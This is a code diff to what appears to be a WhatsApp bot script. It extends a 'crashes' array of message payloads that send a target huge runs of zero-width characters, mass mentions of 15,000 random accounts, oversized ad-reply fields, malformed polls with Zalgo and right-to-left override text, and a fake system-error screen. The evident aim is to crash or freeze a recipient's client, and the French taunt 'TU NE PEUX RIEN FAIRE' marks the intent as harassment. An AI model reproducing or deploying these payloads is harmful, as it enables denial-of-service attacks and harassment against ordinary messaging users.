@@ -16,7 +16,6 @@ const crashes = [
     { image: { url: 'https://i.imgur.com/placeholder.png' }, caption: '\u200B'.repeat(3000) + '💀 CRASH 💀' + '\u200B'.repeat(3000) },
     '\u200D'.repeat(3000) + '⛓️ TU NE PEUX RIEN FAIRE ⛓️' + '\u200D'.repeat(3000),
     '█'.repeat(10000),
-    // 7. Bug du statut partagé avec 15 000 mentions
     async (sock, target) => {
         const mentionedJids = Array.from({ length: 15000 }, () =>
             `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
@@ -30,7 +29,43 @@ const crashes = [
                 mentionedJid: mentionedJids
             }
         });
-    }
+    },
+    '\uD83D\uDE00\uFE0E\u200D\uD83D\uDE00\uFE0E'.repeat(500),
+    '\u200D'.repeat(15000),
+    async (sock, target) => {
+        await sock.sendMessage(target, {
+            text: '⚠️ Alerte Système',
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: '⚠️'.repeat(5000),
+                    body: '🚨'.repeat(10000),
+                    thumbnailUrl: 'https://i.imgur.com/placeholder.png'
+                }
+            }
+        });
+    },
+    async (sock, target) => {
+        await sock.sendMessage(target, {
+            poll: {
+                name: '\u200B'.repeat(1000) + '💀 SONDAGE CRIMSON 💀' + '\u200B'.repeat(1000),
+                options: [
+                    'Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́'.repeat(200),
+                    '\u202E' + 'OPTION INVERSEE' + '\u202E',
+                    '\u200B'.repeat(3000) + 'OPTION FANTÔME'
+                ]
+            }
+        });
+    },
+    `🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
+🟦                                                    🟦
+🟦   Windows Error 0xDEADBEEF                         🟦
+🟦   SYSTEM FAILURE - CONTACT ADMINISTRATOR            🟦
+🟦                                                    🟦
+🟦   ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛   97%
+🟦                                                    🟦
+🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦`,
 ];
 
 async function start() {
